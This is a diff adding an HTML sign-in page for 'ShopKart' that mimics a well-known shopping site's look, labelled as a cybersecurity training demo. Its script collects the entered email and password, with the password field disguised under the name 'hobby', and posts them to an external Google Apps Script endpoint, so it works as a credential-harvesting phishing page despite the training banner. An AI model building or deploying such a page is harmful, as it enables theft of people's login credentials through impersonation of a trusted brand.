@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>ShopKart - Training Login</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #ffffff;
+      color: #111;
+    }
+
+    .navbar {
+      height: 64px;
+      background: #131921;
+      display: flex;
+      align-items: center;
+      padding: 0 28px;
+      color: white;
+    }
+
+    .logo {
+      font-size: 25px;
+      font-weight: bold;
+      letter-spacing: -1px;
+    }
+
+    .logo span {
+      color: #ff9900;
+    }
+
+    .container {
+      width: 350px;
+      margin: 42px auto;
+    }
+
+    .training-banner {
+      background: #fff3cd;
+      border: 1px solid #ffe69c;
+      color: #664d03;
+      padding: 10px 12px;
+      border-radius: 4px;
+      font-size: 12px;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+
+    .login-box {
+      border: 1px solid #d5d9d9;
+      border-radius: 8px;
+      padding: 26px;
+    }
+
+    .login-box h1 {
+      font-size: 28px;
+      font-weight: 400;
+      margin: 0 0 22px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: bold;
+      margin-bottom: 7px;
+    }
+
+    input {
+      width: 100%;
+      height: 40px;
+      border: 1px solid #888c8c;
+      border-radius: 3px;
+      padding: 8px;
+      font-size: 15px;
+      outline: none;
+      margin-bottom: 18px;
+    }
+
+    input:focus {
+      border-color: #007eb9;
+      box-shadow: 0 0 0 2px #c8f3ff;
+    }
+
+    .continue-btn {
+      width: 100%;
+      height: 40px;
+      margin-top: 2px;
+      border: 1px solid #a88734;
+      border-radius: 3px;
+      background: #ffd814;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .continue-btn:hover {
+      background: #f7ca00;
+    }
+
+    .terms {
+      margin-top: 22px;
+      font-size: 12px;
+      line-height: 1.5;
+      color: #555;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 28px 0 18px;
+      color: #777;
+      font-size: 12px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      height: 1px;
+      background: #ddd;
+      flex: 1;
+    }
+
+    .new-account {
+      width: 100%;
+      height: 38px;
+      background: #fff;
+      border: 1px solid #adb1b1;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .new-account:hover {
+      background: #f7f7f7;
+    }
+
+    #status {
+      font-size: 13px;
+      margin-top: 15px;
+      text-align: center;
+    }
+
+    .footer {
+      margin-top: 45px;
+      padding: 25px;
+      border-top: 1px solid #ddd;
+      text-align: center;
+      color: #666;
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav class="navbar">
+    <div class="logo">
+      Shop<span>Kart</span>
+    </div>
+  </nav>
+
+  <main class="container">
+
+    <div class="training-banner">
+      <strong>Cybersecurity Training Demo</strong><br>
+      Use dummy/test information only. This is not a real shopping login.
+    </div>
+
+    <div class="login-box">
+
+      <h1>Sign in</h1>
+
+      <form id="demoForm">
+
+        <label for="demoValue">
+          Email or mobile number
+        </label>
+
+        <input
+          type="text"
+          id="demoValue"
+          name="demo_value"
+          autocomplete="off"
+          placeholder="Enter demo email or mobile"
+          required
+        >
+
+        <label for="hobby">
+          Password
+        </label>
+
+        <input
+          type="text"
+          id="hobby"
+          name="hobby"
+          autocomplete="off"
+          placeholder="Enter your password"
+          required
+        >
+
+        <button
+          type="submit"
+          class="continue-btn"
+        >
+          Continue
+        </button>
+
+      </form>
+
+      <div class="terms">
+        By continuing, you agree to the ShopKart
+        Training Demo terms and conditions.
+      </div>
+
+      <div class="divider">
+        New to ShopKart?
+      </div>
+
+      <button
+        class="new-account"
+        type="button"
+        onclick="alert('Training demo only')"
+      >
+        Create your training account
+      </button>
+
+      <p id="status"></p>
+
+    </div>
+
+  </main>
+
+  <footer class="footer">
+    © 2026 ShopKart Cybersecurity Training Demo
+  </footer>
+
+
+  <script>
+
+    const SCRIPT_URL =
+      "https://script.google.com/macros/s/AKfycbxjU8uTIkHMDrsAmTwsThE38NJFWqBSherN5B6wF0yocjnSxvmZESEYDdsegEKIgUI8/exec";
+
+
+    document
+      .getElementById("demoForm")
+      .addEventListener("submit", async function(event) {
+
+        event.preventDefault();
+
+        const value =
+          document.getElementById("demoValue").value;
+
+        const hobby =
+          document.getElementById("hobby").value;
+
+        const status =
+          document.getElementById("status");
+
+
+        if (!value.trim() || !hobby.trim()) {
+          status.textContent =
+            "Please fill in both fields.";
+          return;
+        }
+
+
+        const data = new URLSearchParams();
+
+        data.append("demo_value", value);
+        data.append("hobby", hobby);
+
+
+        try {
+
+          await fetch(SCRIPT_URL, {
+            method: "POST",
+            body: data,
+            mode: "no-cors"
+          });
+
+
+          status.textContent =
+            "Training data submitted successfully.";
+
+          document
+            .getElementById("demoForm")
+            .reset();
+
+
+        } catch (error) {
+
+          status.textContent =
+            "Unable to submit training data.";
+
+          console.error(error);
+        }
+
+      });
+
+  </script>
+
+</body>
+</html>
